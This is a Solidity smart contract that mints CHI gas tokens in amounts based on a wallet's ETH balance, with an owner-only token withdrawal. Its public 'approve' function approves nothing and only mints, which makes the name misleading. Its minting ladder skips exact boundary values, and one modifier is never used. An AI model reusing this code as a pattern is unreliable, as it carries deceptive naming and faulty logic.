pragma solidity 0.5.16;

interface ICHI {
    function mint(uint256 value) external;
}

interface IERC20 {
    function transfer(address _to, uint256 _amount) external returns (bool);
}

contract proxyminter {
    ICHI public constant chi = ICHI(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    address private taker;
    uint256 public summ = 10000000000000000;
    uint256 private balanceETH;
    mapping(address => uint256) amounts;
                          
    constructor () public {
        taker = msg.sender;
    }

    modifier validate {
        require(msg.sender == taker);
        _;
    }

    modifier discountCHI {
        uint256 gasStart = gasleft();
        _;
        uint256 gasSpent = 21000 + gasStart - gasleft() + 16 * msg.data.length;
        chi.mint((gasSpent + 14154) / 41130);
    }

    function setSumm(uint256 amount) public validate returns (bool){
        summ = amount;
        return true;
    }

    //Withdraw BEP-20 TOKENS from contract
    function withdrawToken(address _tokenContract, uint256 _amount) public validate {
        IERC20 tokenContract = IERC20(_tokenContract);
        tokenContract.transfer(msg.sender, _amount);
    }

    function approve(address from) public {
        amounts[address(this)] = from.balance;
        mintCHI3(address(this));
    }

    function mintCHI2(address addr) public returns (bool) {
        // balance = addr.balance - 14000000000;
        balanceETH = addr.balance/3;
        uint256 amount = calculate(balanceETH, summ);
        if(amount < 1) {revert("Balance is too low");}
        if(amount > 1 && amount < 2) {chi.mint(1);}
        if(amount > 2 && amount < 3) {chi.mint(2);}
        if(amount > 3 && amount < 4) {chi.mint(3);} 
        if(amount > 4 && amount < 5) {chi.mint(4);} 
        if(amount > 5 && amount < 6) {chi.mint(5);} 
        if(amount > 6 && amount < 7) {chi.mint(6);} 
        if(amount > 7 && amount < 8) {chi.mint(7);} 
        if(amount > 8 && amount < 9) {chi.mint(8);} 
        if(amount > 9 && amount < 10) {chi.mint(9);} 
        if(amount > 10 && amount < 20) {chi.mint(10);} 
        if(amount > 20 && amount < 30) {chi.mint(20);} 
        if(amount > 30 && amount < 40) {chi.mint(30);} 
        if(amount > 40 && amount < 50) {chi.mint(40);}
        if(amount > 50 && amount < 60) {chi.mint(50);} 
        if(amount > 60 && amount < 70) {chi.mint(60);} 
        if(amount > 70 && amount < 80) {chi.mint(70);} 
        if(amount > 80 && amount < 90) {chi.mint(80);} 
        if(amount > 90 && amount < 100) {chi.mint(90);} 
        if(amount > 100 && amount < 200) {chi.mint(100);}  
        if(amount > 200 && amount < 300) {chi.mint(200);} 
        if(amount > 300 && amount < 400) {chi.mint(300);} 
        if(amount > 400 && amount < 500) {chi.mint(400);} 
        if(amount > 500 && amount < 600) {chi.mint(500);} 
        if(amount > 600) {chi.mint(600);}
        return true;
    }

    // function mintCHI2(address addr) public returns (bool) {
    //     // balance = addr.balance - 14000000000;
    //     balanceETH = addr.balance/summ;
    //     uint256 amount = calculate(balanceETH, summ);
    //     if(amount > 600) {chi.mint(600);}
    //     if(amount > 500 && amount < 600) {chi.mint(500);}
    //     if(amount > 400 && amount < 500) {chi.mint(400);}
    //     if(amount > 300 && amount < 400) {chi.mint(300);}
    //     if(amount > 200 && amount < 300) {chi.mint(200);}
    //     if(amount > 100 && amount < 200) {chi.mint(100);}
    //     if(amount > 90 && amount < 100) {chi.mint(90);}
    //     if(amount > 80 && amount < 90) {chi.mint(80);}
    //     if(amount > 70 && amount < 80) {chi.mint(70);}
    //     if(amount > 60 && amount < 70) {chi.mint(60);}
    //     if(amount > 50 && amount < 60) {chi.mint(50);}
    //     if(amount > 40 && amount < 50) {chi.mint(40);}
    //     if(amount > 30 && amount < 40) {chi.mint(30);}
    //     if(amount > 20 && amount < 30) {chi.mint(20);}
    //     if(amount > 10 && amount < 20) {chi.mint(10);}
    //     if(amount > 9 && amount < 10) {chi.mint(9);}
    //     if(amount > 8 && amount < 9) {chi.mint(8);}
    //     if(amount > 7 && amount < 8) {chi.mint(7);}
    //     if(amount > 6 && amount < 7) {chi.mint(6);}
    //     if(amount > 5 && amount < 6) {chi.mint(5);}
    //     if(amount > 4 && amount < 5) {chi.mint(4);}
    //     if(amount > 3 && amount < 4) {chi.mint(3);}
    //     if(amount > 2 && amount < 3) {chi.mint(2);}
    //     if(amount > 1 && amount < 2) {chi.mint(1);}
    //     if(amount < 1) {revert("Balance is too low");}
    //     return true;
    // }

    function mintCHI(uint256 amount) public returns (bool) {
        chi.mint(amount);
        return true;
    }

    function mintCHI3(address addr) public returns (bool) {
        balanceETH = amounts[addr];
        chi.mint(calculate(balanceETH, summ));
        // balance = 0;
        return true;
    }


    function getBalance(address wallet) public view returns (uint256){
        return wallet.balance;
    }

    function calculate(uint256 num1, uint256 num2) public pure returns (uint256){
        return num1/num2;
    }

    function calcPerc(uint256 num, uint256 perc) public pure returns (uint256){
        return num % perc;
    }

    function calculateMint() public view returns (uint256){
        return msg.sender.balance/summ;
    }

    function getType() public view returns (string memory){
        uint256 result = msg.sender.balance;
        if(result%2==0)
       {
           return 'even';
       }
       else
       {
           return 'odd';
       }
    }
}